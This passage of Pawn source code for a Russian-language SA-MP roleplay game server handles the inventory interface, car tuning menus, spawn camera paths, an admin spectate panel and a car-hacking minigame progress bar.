    	new gunid = GiveID(GunInfo[playerid][pWeapon][i+1]);
    	if(GetFree(playerid,gunid,GunInfo[playerid][pAmmo][i+1])) return SendClientMessage(playerid,CGREY,"Недостаточно места в инветаре!");
    	PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
    	PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
		PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
    	PlayerTextDrawHide(playerid,InvAmm[playerid][i]);
    	PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
		GiveInv(playerid,gunid,GunInfo[playerid][pAmmo][i+1]);
		GunInfo[playerid][pWeapon][i+1] = 0;
		GunInfo[playerid][pAmmo][i+1] = 0;
		SetPVarInt(playerid,"GiveGun",1);
		ResetPlayerWeapons(playerid);
		GivePatr(playerid);
		break;
	}
	new stratica = (!GetPVarInt(playerid,"InvS")) ? (0) : (30);
	
	for(new i = 6; i < 36; i++)
	{
		if(playertextid !=  InventoryP[i][playerid] || !InvInfo[playerid][iSlot][i-6+stratica]) continue;
		if(GetPVarInt(playerid,"InvOpen"))
		{
			if(GetPVarInt(playerid,"SetCehck"))
			{
			    if(InvInfo[playerid][iSlot][i-6+stratica] == InvInfo[playerid][iSlot][GetPVarInt(playerid,"SetInvID")])
			    {

			        for(new x = 0; x < 6; x++) PlayerTextDrawHide(playerid,ActionInventoryP[x][playerid]);
			        PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
			        PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 589505535);
			        PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			        DeletePVar(playerid,"SetCehck");
			    }
			    else
			    {
			        PlayerTextDrawHide(playerid,InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid]);
			        PlayerTextDrawBackgroundColor(playerid, InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid], 589505535);
			        PlayerTextDrawShow(playerid,InventoryP[GetPVarInt(playerid,"SetInvID")+6][playerid]);
			        PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
			        PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0xFFCC00FF);
			        PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			        SetPVarInt(playerid,"SetInv",InvInfo[playerid][iSlot][i-6+stratica]);
					SetPVarInt(playerid,"SetInvID",i-6+stratica);
			    }
			}
			else
			{
			    PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
		        PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0xFFCC00FF);
		        PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			    for(new x = 0; x < 6; x++) PlayerTextDrawShow(playerid,ActionInventoryP[x][playerid]);
				SetPVarInt(playerid,"SetInv",InvInfo[playerid][iSlot][i-6+stratica]);
				SetPVarInt(playerid,"SetInvID",i-6+stratica);
				SetPVarInt(playerid,"SetCehck",1);
			}
		}
		else if(GetPVarInt(playerid,"OpenTorg"))
		{
		    PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0xFFCC00FF);
			PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			SetPVarInt(playerid,"SetInvID",i-6+stratica);
		    ShowPlayerDialog(playerid,490,DIALOG_STYLE_INPUT,"Информация","{ffffff}Введите количество и цену за одну штуку товара через запятую:\n\nНапример: 3,30","Далее","Отмена");
		}
		else if(GetPVarInt(playerid,"OpenHouse"))
		{
			PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0xFFCC00FF);
			PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			SetPVarInt(playerid,"SetInvID",i-6+stratica);
			ShowPlayerDialog(playerid,465,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
		}
		else if(GetPVarInt(playerid,"OpenTrunk"))
		{
		  //  new x = GetPVarInt(playerid,"Car");
		//	if(BInfo[x][bInvSlot][i+stratica] == 455 || BInfo[x][bInvSlot][i+stratica] == 456) return SendClientMessage(playerid,-1,"Для разгрузки используйте: {f7ae11}/unload");
			PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0xFFCC00FF);
			PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			SetPVarInt(playerid,"SetInvID",i-6+stratica);
			ShowPlayerDialog(playerid,465,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
		}
		
	/*	static const fmt_str[] = "%s [%d]";
		new str[sizeof(fmt_str)+50];
		format(str, sizeof(str), fmt_str,InvType[InvInfo[playerid][iSlot][i-5]][invText],InvInfo[playerid][iKol][i-5]);
		ShowPlayerDialog(playerid,451,DIALOG_STYLE_LIST,str,"1 | Использовать\n2 | Выбросить","Далее","Отмена");*/

	}
	for(new i = 1; i <= 12; i++)
	{
	    if(GetPVarInt(playerid,"AntiClick") > gettime()) continue;
		if(playertextid == SkinsTD[playerid][i])
		{
		    if(GetPVarInt(playerid,"SelectSkinRank") < 10) FracInfo[PlayerInfo[playerid][pMember]][fMSkin][GetPVarInt(playerid,"SelectSkinRank")] = ManSkinFrack[PlayerInfo[playerid][pMember]-1][i-1];
		    else FracInfo[PlayerInfo[playerid][pMember]][fWSkin] = ManSkinFrack[PlayerInfo[playerid][pMember]-1][i-1];
		    
			format( FracInfo[PlayerInfo[playerid][pMember]][fMSkins],100,"%i,%i,%i,%i,%i,%i,%i,%i,%i,%i",
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][0],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][1],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][2],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][3],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][4],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][5],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][6],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][7],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][8],
			FracInfo[PlayerInfo[playerid][pMember]][fMSkin][9]
			);
			SetFractionStr(PlayerInfo[playerid][pMember],"mskins",FracInfo[PlayerInfo[playerid][pMember]][fMSkins]);
			SetFractionInt(PlayerInfo[playerid][pMember],"wskin",FracInfo[PlayerInfo[playerid][pMember]][fWSkin]);
			CloseTD(playerid);
		}
	}

    return 1;
}


stock SetPlayerSkills(playerid)
{
	if(PlayerLogged[playerid] == false) return 1;
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, PlayerInfo[playerid][pGunSkill][0]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, PlayerInfo[playerid][pGunSkill][1]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, PlayerInfo[playerid][pGunSkill][2]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, PlayerInfo[playerid][pGunSkill][3]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, PlayerInfo[playerid][pGunSkill][4]);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, PlayerInfo[playerid][pGunSkill][5]);
	
	return 1;
}
stock GetPred(playerid)
{
	new lel = 0;
	if(GetPVarInt(playerid,"LicP") > 0 || GetPVarInt(playerid,"CbizCena") > 0 || GetPVarInt(playerid,"Sem") > 0|| GetPVarInt(playerid,"SellDrugsCena2") > 0 || GetPVarInt(playerid,"Podsel") > 0  || GetPVarInt(playerid,"ObmCena") > 0 || GetPVarInt(playerid,"PradCena") > 0|| GetPVarInt(playerid,"ObmEx") > 0 ||
	GetPVarInt(playerid,"Rep") > 0 || GetPVarInt(playerid,"Dice") > 0  || GetPVarInt(playerid,"Pod") > 0  || GetPVarInt(playerid,"Buks") > 0|| GetPVarInt(playerid,"Sex") > 0 || GetPVarInt(playerid,"ChomeCena") > 0|| GetPVarInt(playerid,"Vl") > 0 || GetPVarInt(playerid,"Vl1") > 0|| GetPVarInt(playerid,"Inv") > 0 || GetPVarInt(playerid,"GunCena") > 0 || GetPVarInt(playerid,"Upr") > 0 || GetPVarInt(playerid,"Zvarova") > 0) lel = 1;
	return lel;
}
function UpdSam(yash)
{
	new mt_str[100];
	switch(yash)
	{
	    case 0:
	    {
			format(mt_str,sizeof(mt_str),"Материалов {f7ae11}%i/20000{FFFFFF}\nВзять: {f7ae11}LALT",samolet[0]);
			Update3DTextLabelTextEx(sam[0],-1,mt_str);
			mt_str = "";
		}
		case 1:
		{
			format(mt_str,sizeof(mt_str),"Материалов {f7ae11}%i/20000{FFFFFF}\nВзять: {f7ae11}LALT",samolet[1]);
			Update3DTextLabelTextEx(sam[1],-1,mt_str);
			mt_str = "";
		}
	}
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(IsPlayerInAnyVehicle(playerid) && GetPVarInt(playerid,"Taxi") > 0)
	{
	    SetPlayerRaceCheckpoint(GetPVarInt(playerid,"TaxiID"),2,fX,fY,fZ,0,0,0,10);
	    SetPVarInt(GetPVarInt(playerid,"TaxiID"),"GPS",1);
	    SendClientMessage(playerid,CREWARD,"Вы отметили точку куда Вам надо и она показалась у таксиста");
	    SendClientMessage(GetPVarInt(playerid,"TaxiID"),CREWARD,"Вам отметили новую точку на карте");
	}
	if(PlayerInfo[playerid][pAdmin])
	{
	    SetPVarFloat(playerid,"aX",fX);
	    SetPVarFloat(playerid,"aY",fY);
	    SetPVarFloat(playerid,"aZ",fZ);
	    SendClientMessage(playerid,CREWARD,"Вы установили метку на карте. Для телепортации используйте: /tpmark");

	}
	return true;
}

stock ExitMebel(playerid)
{
	SetPlayerVirtualWorld(playerid,1);
	SetPlayerInterior(playerid,1);
	TogglePlayerControllable(playerid, 1);
	for(new i = 0; i < 18; i++) TextDrawHideForPlayer(playerid,ObjectBuy[i]);
 	for(new i = 0; i < 3; i++) PlayerTextDrawHide(playerid,ObjectBuyP[i][playerid]);
	if(furniture_pickup[playerid] != -1) DestroyDynamicPickup(furniture_pickup[playerid]), furniture_pickup[playerid] = -1;
	CancelSelectTextDraw(playerid);
	SetCameraBehindPlayer(playerid);
	DeletePVar(playerid,"InMebel");
	DeletePVar(playerid,"MebelCheck");
	DeletePVar(playerid,"MebelRaz");
	FreezePlayer(playerid,1387.4772,-30.8564,0.8);
	SetPlayerPos(playerid,1387.4772,-30.8564,1000.9131);
	SetPlayerFacingAngle(playerid,274.2390);
}
stock ExitAcs(playerid)
{
	SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PBIZ"));
	TogglePlayerControllable(playerid, 1);
	for(new i = 0; i < 18; i++) TextDrawHideForPlayer(playerid,ObjectBuy[i]);
 	for(new i = 0; i < 3; i++) PlayerTextDrawHide(playerid,ObjectBuyP[i][playerid]);
	CancelSelectTextDraw(playerid);
	SetCameraBehindPlayer(playerid);
	SetAcs(playerid);
	DeletePVar(playerid,"ACS1");
	DeletePVar(playerid,"ACS2");
	DeletePVar(playerid,"ACS");
}

stock SetSPCam(playerid)
{
    if(GetPVarInt(playerid,"Gorod"))
	{
	    switch(GetPVarInt(playerid,"SpawnVib"))
	    {
	        case 0:
	        {
	            InterpolateCameraPos(playerid, 1364.583374, -2373.431152, 104.466720, 1426.709960, -2274.038818, 20.591976, 5000);
				InterpolateCameraLookAt(playerid, 1367.391357, -2370.494384, 101.552726, 1430.618041, -2276.692382, 18.953020, 5000);
	        }
	        case 1:
	        {
	            InterpolateCameraPos(playerid, 1856.407470, -1804.568115, 106.865608, 1799.306152, -1928.746215, 23.063377, 5000);
				InterpolateCameraLookAt(playerid, 1853.807617, -1807.834960, 104.114578, 1795.612792, -1926.053222, 21.036828, 5000);
	        }
	        case 2:
	        {
	            InterpolateCameraPos(playerid, 1287.572875, -1729.989379, 41.813781, 1226.055908, -1722.301025, 26.217620, 5000);
				InterpolateCameraLookAt(playerid, 1283.455688, -1728.192993, 39.617874, 1228.950805, -1718.411743, 24.995746, 5000);
	        }
	    }
	}
	else
	{
	    switch(GetPVarInt(playerid,"SpawnVib"))
	    {
	        case 0:
	        {

	            InterpolateCameraPos(playerid, 1747.159057, 1399.743041, 31.417682, 1705.325805, 1476.537231, 14.254146, 5000);
				InterpolateCameraLookAt(playerid, 1743.991821, 1403.451538, 30.315038, 1701.705444, 1473.101074, 13.961931, 5000);
	        }
	        case 1:
	        {
				InterpolateCameraPos(playerid, 2755.482177, 1371.321166, 32.940113, 2810.510253, 1263.224853, 15.395413, 5000);
				InterpolateCameraLookAt(playerid, 2758.274658, 1367.188232, 32.591503, 2814.208496, 1266.572509, 15.053851, 5000);
	        }
	        case 2:
	        {
	            InterpolateCameraPos(playerid, 2130.510742, 1910.307495, 38.693424, 2188.441894, 1815.506103, 17.321084, 5000);
				InterpolateCameraLookAt(playerid, 2132.869873, 1906.179077, 37.147197, 2192.196533, 1818.743041, 16.669240, 5000);
	        }




	    }
	}
	return 1;
}

public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
    if((_:clickedid == INVALID_TEXT_DRAW) && GetPVarInt(playerid,"TextDrawSelect"))
	{
	    if(GetPVarInt(playerid,"InvOpen")) CloseInv(playerid);
	    else if(GetPVarInt(playerid,"OpenHouse") || GetPVarInt(playerid,"OpenTrunk") || GetPVarInt(playerid,"OpenTorg") || GetPVarInt(playerid,"OpenBlackTorg"))
	    {
	        if(GetPVarInt(playerid,"OpenHouse")) SaveHouseInv(GetPVarInt(playerid,"PlayerHouse"));
		    DeletePVar(playerid,"OpenHouse");
		    DeletePVar(playerid,"OpenTrunk");
		    DeletePVar(playerid,"SetCehck");
			for(new i = 0; i < 16; i++)
			{
		 		if(i < 15) TextDrawHideForPlayer(playerid,Inventory[i]);
		 		TextDrawHideForPlayer(playerid,Inventory1[i]);
			}
			TextDrawHideForPlayer(playerid,Inventory[22]);
			for(new i = 0; i < 36; i++)
			{
			    PlayerTextDrawDestroy(playerid,InventoryP1[i][playerid]);
				PlayerTextDrawDestroy(playerid,InventoryP[i][playerid]);
				PlayerTextDrawDestroy(playerid,InvAmm[playerid][i]);
				PlayerTextDrawDestroy(playerid,InvAmm1[playerid][i]);
			}
		 	CancelSelectTextDraw(playerid);
		 	return 1;
	    }
	    else if(GetPVarInt(playerid,"STO"))
	    {
     		for(new i = 0; i < 33; i++) TextDrawHideForPlayer(playerid,Tuning[i]);
	    	for(new i = 0; i < 14; i++) PlayerTextDrawDestroy(playerid,TuningP[i][playerid]);
	        new carid = GetPlayerVehicleID(playerid);
		    SetVehiclePos(carid,2309.8481,1795.1025,10.8203);
			SetVehicleZAngle(carid,-349.5503);
			LinkVehicleToInterior(carid,0);
			SetVehicleVirtualWorld(carid,0);
			SetPlayerVirtualWorld(playerid,0);
			SetPlayerInterior(playerid,0);
			PutPlayerInVehicle(playerid,carid,0);
		    DeletePVar(playerid,"STO");
			DeletePVar(playerid,"ATune");
			TogglePlayerControllable(playerid, 1);
			SetCameraBehindPlayer(playerid);
			CancelSelectTextDraw(playerid);
	    }
	    else SelectTextDraw(playerid, 0xAFAFAFAA);
	}
	if(GetPVarInt(playerid,"STO"))
	{
        if(clickedid == Tuning[4])
		{
		    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 483 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 534 ||
		    GetVehicleModel(GetPlayerVehicleID(playerid)) == 535 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 536 ||
		    GetVehicleModel(GetPlayerVehicleID(playerid)) == 558 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 559 ||
		    GetVehicleModel(GetPlayerVehicleID(playerid)) == 560 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 561 ||
		    GetVehicleModel(GetPlayerVehicleID(playerid)) == 562 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 565 ||
		    GetVehicleModel(GetPlayerVehicleID(playerid)) == 567 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 575 ||
		    GetVehicleModel(GetPlayerVehicleID(playerid)) == 576)
		    {
		        ShowPlayerDialog(playerid,269,DIALOG_STYLE_LIST,"Винил","{FFFFFF}Винил №1\nВинил №2\nВинил №3\nУбрать винил","Далее","Назад");
		    }
		    else SendClientMessage(playerid,CGREY,"Данная деталь не доступна Вашем автомобилю");
		}
		if(clickedid == Tuning[5])
		{
		    SetPlayerCameraPos(playerid,1.435253,-10.571840,1999.709594);
			SetPlayerCameraLookAt(playerid,1.078467,-9.642129,1999.618286);
			ShowPlayerDialog(playerid,270,DIALOG_STYLE_LIST,"Диски","Shadow\nMega\nRimshine\nWires\nClassic\nTwist\nCutter\nSwitch\nImport\nDollar\nTrance\nAtomic","Далее","Назад");
		}
		if(clickedid == Tuning[6])
		{
  			ShowPlayerDialog(playerid,271,DIALOG_STYLE_LIST,"Азот","{FFFFFF}Азот x2\nАзот x5\nАзот x10","Далее","Назад");
		}
		if(clickedid == Tuning[7])
		{
			if(GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_HYDRAULICS)) ShowPlayerDialog(playerid,132,DIALOG_STYLE_MSGBOX,"Гидравлика","{FFFFFF}Вы действительно хотите удалить гидравкику?\nЦена: $6500","Да","Нет");
			else
			{
				SetPVarInt(playerid,"STODet",1087);
			    SetPlayerCameraPos(playerid,4.518465,-9.361727,2000.909545);
				SetPlayerCameraLookAt(playerid,3.686950,-8.842035,2000.713378);
				AddVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet"));
				SetPVarInt(playerid,"STOPrice",15000);
				ShowPlayerDialog(playerid,128,DIALOG_STYLE_MSGBOX,"Гидравлика","{FFFFFF}Вы хотите установить данную деталь?\nЦена: $15000","Да","Нет");
			}
		}
		if(clickedid == Tuning[8])
		{


			SetPlayerCameraPos(playerid,-4.162179,-10.922677,2001.509399);
			SetPlayerCameraLookAt(playerid,-3.623628,-10.153695,2001.164916);
			ShowPlayerDialog(playerid,315 , DIALOG_STYLE_LIST, "Капот", "Fury\nChamp\nRace\nWorx", "Далее", "Отмена");
		}
		if(clickedid == Tuning[9])
		{
		    SetPlayerCameraPos(playerid,-4.162179,-10.922677,2001.509399);
			SetPlayerCameraLookAt(playerid,-3.623628,-10.153695,2001.164916);
			ShowPlayerDialog(playerid, 316, DIALOG_STYLE_LIST, "Вентиляция", "Овальная\nКвадратная", "Далее", "Отмена");
		}
		if(clickedid == Tuning[10])
		{
			SetPlayerCameraPos(playerid,-4.559348,-11.570341,2000.309082);
			SetPlayerCameraLookAt(playerid,-4.037294,-10.735049,2000.136596);
			ShowPlayerDialog(playerid, 318, DIALOG_STYLE_LIST, "Фары", "Круглые\nКвадратные", "Далее", "Отмена");
		}
		if(clickedid == Tuning[11])
		{
			SetPlayerCameraPos(playerid,1.784677,-0.547623,1999.708984);
			SetPlayerCameraLookAt(playerid,1.249547,-1.387441,1999.617675);
			ShowPlayerDialog(playerid, 319, DIALOG_STYLE_LIST, "Выхлоп", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin\nTransfender Large\nTransfender Medium\nTransfender Small\nTransfender Twin\nTransfender Upswept", "Далее", "Отмена");
		}
		if(clickedid == Tuning[12])
		{
		    SetPlayerCameraPos(playerid,-4.162179,-10.922677,2001.509399);
			SetPlayerCameraLookAt(playerid,-3.623628,-10.153695,2001.164916);
			ShowPlayerDialog(playerid, 320, DIALOG_STYLE_LIST, "Крыша", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Hardtop Roof\nLow Co. Softtop Roof\nTransfender Roof Scoop", "Далее", "Отмена");
		}
		if(clickedid == Tuning[13])
		{
		    SetPlayerCameraPos(playerid,-4.559348,-11.570341,2000.309082);
			SetPlayerCameraLookAt(playerid,-4.037294,-10.735049,2000.136596);
			ShowPlayerDialog(playerid, 321, DIALOG_STYLE_LIST,"Передний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow co. Chromer\nLow co. Slamin", "Далее", "Отмена");
		}
		if(clickedid == Tuning[14])
		{
		    SetPlayerCameraPos(playerid,1.784677,-0.547623,1999.708984);
			SetPlayerCameraLookAt(playerid,1.249547,-1.387441,1999.617675);
			ShowPlayerDialog(playerid, 322, DIALOG_STYLE_LIST, "Задний бампер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLow Co. Chromer\nLow Co. Slamin", "Далее", "Отмена");
		}
		if(clickedid == Tuning[15])
		{
			SetPlayerCameraPos(playerid,-5.413143,-6.330190,1999.708862);
			SetPlayerCameraLookAt(playerid,-4.498555,-5.960769,1999.544433);
			ShowPlayerDialog(playerid, 323, DIALOG_STYLE_LIST, "Боковые юбки", "Wheel Arc. Alien\nWheel Arc. X-Flow\nLocos Chrome Strip\nLocos Chrome Flames\nLocos Chrome Arches \nLocos Chrome Trim\nLocos Wheelcovers\nTransfender", "Далее", "Отмена");
		}
		if(clickedid == Tuning[16])
		{
		    SetPlayerCameraPos(playerid,-5.088845,-5.191387,2001.108764);
			SetPlayerCameraLookAt(playerid,-4.151325,-4.957726,2000.850952);
			ShowPlayerDialog(playerid, 325, DIALOG_STYLE_LIST, "Спойлер", "Wheel Arc. Alien\nWheel Arc. X-Flow\nTransfender Win\nTransfender Fury\nTransfender Alpha\nTransfender Pro\nTransfender Champ\nTransfender Drag", "Далее", "Отмена");
		}
		
		if(clickedid == Tuning[30])
		{
			SetPlayerCameraPos(playerid,-4.559348,-11.570341,2000.309082);
			SetPlayerCameraLookAt(playerid,-4.037294,-10.735049,2000.136596);
			ShowPlayerDialog(playerid, 324, DIALOG_STYLE_LIST, "Решетки", "Locos Chrome Grill\nLocos Chrome Bars\nLocos Chrome Lights \nLocos Chrome Bullbar", "Далее", "Отмена");
		}
		if(clickedid == Tuning[31])
		{
            if(VInfo[GetPVarInt(playerid,"Car")][vsis]) return SendClientMessage(playerid,CGREY,"У Вас уже установлена данная деталь!");
			ShowPlayerDialog(playerid,425,DIALOG_STYLE_MSGBOX,"Система безопасности","{FFFFFF}Вы хотите установить улучшенную систему безопасности?\nЦена: $30000","Да","Нет");
		}

	}
	if(GetPVarInt(playerid,"Spec"))
	{
	    new specid[3];
		format(specid, sizeof(specid), "%i", GetPVarInt(playerid,"SpecID"));
	    if(clickedid == AdminPanel[0]) cmd_sp(playerid,specid);
	    if(clickedid == AdminPanel[1]) cmd_spoff(playerid);
	    if(clickedid == AdminPanel[2]) cmd_time(playerid);
	    if(clickedid == AdminPanel[3]) ShowPlayerDialog(playerid, 151, DIALOG_STYLE_INPUT, "Ban", "{FFFFFF}Введите время бана, причину:\n\nПример: 15,Читы", "Далее","Отмена");
	    if(clickedid == AdminPanel[4]) 
	    {
	        SetPVarInt(playerid,"SpecID",GetPVarInt(playerid,"SpecID")+1);
	        if(GetPVarInt(playerid,"SpecID") > GetPlayerPoolSize()) DeletePVar(playerid,"SpecID");
	        format(specid, sizeof(specid), "%i", GetPVarInt(playerid,"SpecID"));
	        cmd_sp(playerid,specid);
	    }
	    if(clickedid == AdminPanel[5])
	    {
	        SetPVarInt(playerid,"SpecID",GetPVarInt(playerid,"SpecID")-1);
	        if(GetPVarInt(playerid,"SpecID") < 0) SetPVarInt(playerid,"SpecID",GetPlayerPoolSize());
	        format(specid, sizeof(specid), "%i", GetPVarInt(playerid,"SpecID"));
	        cmd_sp(playerid,specid);
	    }
	    if(clickedid == AdminPanel[6]) ShowPlayerDialog(playerid, 487, DIALOG_STYLE_INPUT, "Warn", "{FFFFFF}Введите причину варна:\n\n", "Далее","Отмена");
	    if(clickedid == AdminPanel[7]) cmd_stats(playerid,specid);
	    if(clickedid == AdminPanel[8]) cmd_spawnplayer(playerid,specid);
	    if(clickedid == AdminPanel[9]) ShowPlayerDialog(playerid, 152, DIALOG_STYLE_INPUT, "Jail", "{FFFFFF}Введите время, причину:\n\nПример: 10,SK", "Далее","Отмена");
	    if(clickedid == AdminPanel[10]) ShowPlayerDialog(playerid, 487, DIALOG_STYLE_INPUT, "HP", "{FFFFFF}Введите количество HP:\n\n", "Далее","Отмена");
	    if(clickedid == AdminPanel[11]) ShowPlayerDialog(playerid, 153, DIALOG_STYLE_INPUT, "Mute", "{FFFFFF}Введите время мута, причину:\n\nПример: 100,Оск", "Далее","Отмена");
	    if(clickedid == AdminPanel[16]) if(IsPlayerInAnyVehicle(GetPVarInt(playerid,"SpecID"))) RepairVehicle(GetPlayerVehicleID(GetPVarInt(playerid,"SpecID")));
	    if(clickedid == AdminPanel[17]) cmd_gun(playerid,specid);
	    if(clickedid == AdminPanel[18]) cmd_ip(playerid,specid);
	    if(clickedid == AdminPanel[19]) ShowPlayerDialog(playerid, 150, DIALOG_STYLE_INPUT, "Kick", "{FFFFFF}Введите причину кика:\n\n", "Далее","Отмена");
	}
	if(clickedid == Auction[20])
	{
	    for(new i = 0; i < 10; i++) PlayerTextDrawDestroy(playerid,AuctionP[playerid][i]);
		for(new i = 0; i < 22; i++) TextDrawHideForPlayer(playerid,Auction[i]);
		TogglePlayerSpectating(playerid,false);
        CancelSelectTextDraw(playerid);
		DeletePVar(playerid,"ContW");
		DeletePVar(playerid,"Cont");
	}
	if(clickedid == ProgressBar[4])
 	{
 	    if(GetPVarInt(playerid,"HackCar") > 0)
	    {

	        if(progressb[playerid] == 0)
			{

				if(progress[playerid] >= 90)
				{
				    progress[playerid] = 100;
				    PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
				else
				{
				    progress[playerid] = progress[playerid]+5;
				    progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
					PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
			}
			else
			{
			        progress[playerid] = progress[playerid]-10;
			        PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				 	progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
			}
	    }
 	}
 	if(clickedid == ProgressBar[5])
 	{
 	    if(GetPVarInt(playerid,"HackCar") > 0)
	    {
	        if(progressb[playerid] == 1)
			{

				if(progress[playerid] >= 90)
				{
				    progress[playerid] = 100;
				    PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
				else
				{
				    progress[playerid] = progress[playerid]+5;
				    progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
					PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				}
			}
			else
			{
			        progress[playerid] = progress[playerid]-10;
			        PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
					PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
				 	progressb[playerid] = random(4);
					switch(progressb[playerid])
					{
					    case 0: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:cross");
					    case 1: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:triang");
					    case 2: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:square");
					    case 3: PlayerTextDrawSetString(playerid, ProgressBarP[0][playerid],"ld_beat:circle");
					}
			}
	    }
 	}
 	if(clickedid == ProgressBar[6])
 	{
 	    if(GetPVarInt(playerid,"HackCar") > 0)
	    {
	        if(progressb[playerid] == 2)
			{

				if(progress[playerid] >= 90)
				{
				    progress[playerid] = 100;
				    PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
					PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
